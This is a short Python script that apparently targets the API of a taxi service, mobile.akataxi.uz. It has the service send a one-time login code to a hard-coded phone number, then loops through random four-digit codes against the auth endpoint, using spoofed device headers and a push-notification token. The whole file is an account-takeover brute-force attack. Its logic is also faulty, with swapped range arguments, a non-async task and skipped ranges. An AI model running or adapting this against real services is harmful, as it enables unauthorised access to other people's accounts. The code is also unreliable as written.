
import json
import requests
import random 
import asyncio


header = {
"accept-encoding":"gzip",
"content-length":"27",
"content-type":"application/json; charset=utf-8",
"host":"mobile.akataxi.uz",
"user-agent":"Dart/3.1 (darto)",
"x-app-build":"28",
"x-app-fcm-token":'ci-a7ns7SCKrvoK2Gl3VXF":"PA91bE-Q82KFiiX-0jrLgi_k7Is_Fy10yb8HG5fOOWo-wEYSUBi0yFFGRKWLZ4fViPFk5_jLIPXzzezJZ56AmZI9yB0gOFra_8ksbkzZw8axOEsiZo0NHs6R3gIr1f8s02EOWRF3d1c',
"x-app-lang":"uz",
"x-app-type":"passenger",
"x-app-version":"1.5.1",
"x-device-model":"Simulator iPhone14,7 | 16.0",
"x-device-type":"android",
"x-device-uid":"QP1A.190711.020",
}
data = {
  "username": "998905650213"
}
r = requests.post("https://mobile.akataxi.uz/api/v1/otp/send-code", headers=header, data=json.dumps(data))

print(r.json())
print(r.status_code)


def task(max, min):

    for i in range(min, max):
        rnum = random.randint(1111, 9999)
        data = {
            "username": "998905650213",
            "code": rnum
        }
        r = requests.post('https://mobile.akataxi.uz/api/v1/auth/exists',  headers=header, data=json.dumps(data))
        data = r.json()
        if data['success']:
            print(r.json())
            print(i)
            print('-------topildi-------')
            return {
                "data":r.json(),
                "code":rnum
            }

        print(data['success'])
        print(rnum)
        print('===============')


asyncio.create_task(task(0000, 1111))
asyncio.create_task(task(1111, 2222))
asyncio.create_task(task(2222, 3333))
asyncio.create_task(task(4444, 5555))
asyncio.create_task(task(6666, 7777))
asyncio.create_task(task(7777, 8888))
asyncio.create_task(task(8888, 9999))